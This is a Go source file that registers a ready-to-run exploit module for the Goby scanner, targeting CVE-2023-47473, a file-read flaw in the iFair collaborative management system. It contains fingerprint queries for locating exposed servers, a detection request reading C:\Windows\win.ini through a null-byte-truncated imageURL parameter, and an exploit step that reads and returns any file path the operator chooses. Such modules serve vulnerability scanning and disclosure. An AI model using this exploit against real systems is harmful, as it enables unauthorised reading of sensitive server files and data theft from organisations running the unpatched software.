package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "iFair collaborative management system /oa/common/components/upload/getuploadimage.jsp File Read Vulnerability (CVE-2023-47473)",
    "Description": "<p>iFair Collaborative management system is a professional collaborative office software, the management system compatibility is strong, suitable for a variety of enterprise types. The software is permanently free, green and safe, and all features can be used without charge. The iFair collaborative management system is compatible with both Linux and Windows operating systems. Users can install and use the IFAIR collaborative management system based on their own requirements.</p><p>Corporate language iFair collaborative management system/oa/common/components/upload/getuploadimage JSP file read loophole, the attacker can use the vulnerability, access to sensitive information server.</p>",
    "Product": "QiYu-iFair",
    "Homepage": "http://www.fuwushe.org/",
    "DisclosureDate": "2024-05-31",
    "PostTime": "2024-05-31",
    "Author": "1070488180@qq.com",
    "FofaQuery": "body=\"/oa/common/css/common.css\" || title=\"协同管理-协同办公系统\"",
    "GobyQuery": "body=\"/oa/common/css/common.css\" || title=\"协同管理-协同办公系统\"",
    "Level": "2",
    "Impact": "<p>Corporate language iFair collaborative management system/oa/common/components/upload/getuploadimage JSP file read loophole, the attacker can use the vulnerability, access to sensitive information server.</p>",
    "Recommendation": "<p>The official has not fixed the vulnerability, please contact the manufacturer to fix the vulnerability:<a href=\"http://www.fuwushe.org/\">http://www.fuwushe.org/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "FilePath",
            "type": "input",
            "value": "C:\\Windows\\win.ini",
            "show": "C:\\Windows\\win.ini"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/oa/common/components/upload/getuploadimage.jsp?imageURL=C:\\Windows\\win.ini%001.png",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "[extensions]",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/oa/common/components/upload/getuploadimage.jsp?imageURL={{{FilePath}}}%001.png",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        "CVE-2023-47473"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.7",
    "Translation": {
        "CN": {
            "Name": "企语iFair协同管理系统 /oa/common/components/upload/getuploadimage.jsp 文件读取漏洞 (CVE-2023-47473)",
            "Product": "服务社-企语iFair",
            "Description": "<p>企语iFair协同管理系统是一款专业的协同办公软件，该管理系统兼容性强，适合多种企业类型。该软件永久免费，绿色安全，无需收取费用即可使用所有功能。企语iFair协同管理系统同时兼容了Linux、Windows两种操作系统，用户可以根据自己需求进行安装使用。</p><p>企语iFair协同管理系统 /oa/common/components/upload/getuploadimage.jsp 文件读取漏洞，攻击者可利用该漏洞，获取服务器敏感信息。<br></p>",
            "Recommendation": "<p>官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.fuwushe.org/\" target=\"_blank\">http://www.fuwushe.org/</a></p>",
            "Impact": "<p>企语iFair协同管理系统 /oa/common/components/upload/getuploadimage.jsp 文件读取漏洞，攻击者可利用该漏洞，获取服务器敏感信息。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "iFair collaborative management system /oa/common/components/upload/getuploadimage.jsp File Read Vulnerability (CVE-2023-47473)",
            "Product": "QiYu-iFair",
            "Description": "<p>iFair Collaborative management system is a professional collaborative office software, the management system compatibility is strong, suitable for a variety of enterprise types. The software is permanently free, green and safe, and all features can be used without charge. The iFair collaborative management system is compatible with both Linux and Windows operating systems. Users can install and use the IFAIR collaborative management system based on their own requirements.<br></p><p>Corporate language iFair collaborative management system/oa/common/components/upload/getuploadimage JSP file read loophole, the attacker can use the vulnerability, access to sensitive information server.<br></p>",
            "Recommendation": "<p>The official has not fixed the vulnerability, please contact the manufacturer to fix the vulnerability:<a href=\"http://www.fuwushe.org/\" target=\"_blank\">http://www.fuwushe.org/</a><br></p>",
            "Impact": "<p>Corporate language iFair collaborative management system/oa/common/components/upload/getuploadimage JSP file read loophole, the attacker can use the vulnerability, access to sensitive information server.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10959"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
